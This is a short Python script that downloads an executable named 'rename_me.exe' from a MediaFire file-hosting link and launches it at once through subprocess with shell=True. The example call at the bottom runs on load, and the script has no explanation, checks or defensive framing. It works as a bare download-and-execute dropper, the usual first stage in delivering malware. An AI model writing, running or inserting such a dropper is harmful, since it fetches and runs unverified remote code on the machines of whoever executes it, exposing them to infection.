import requests
import os
import subprocess

def download_and_execute(url):
    # Get the directory of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Download the executable file
    r = requests.get(url)
    if r.status_code == 200:
        # Save the downloaded file in the script's directory
        file_path = os.path.join(script_dir, "downloaded_file.exe")
        with open(file_path, "wb") as f:
            f.write(r.content)
        # Execute the downloaded file
        subprocess.Popen(file_path, shell=True)
    else:
        print("Failed to download the file.")

# Example usage
download_and_execute("https://download850.mediafire.com/9fx3vj8edv0gAhPjFbjjraFXdyCcW9gqeTL8-y1-ROrcNNF6l3vm40qQ6bSV7Oc8NukglJfEciqSAJhrsA46CAwIkq0Xa9RhK5CNJDaJgu4YovYZyxx86vn8iKJoB-a1Q2HQTflNhIYMcSo8eXHz14Gs_cT62ImicekBj3Lh3H-FyEg/783t7z3i85vcmql/rename_me.exe")
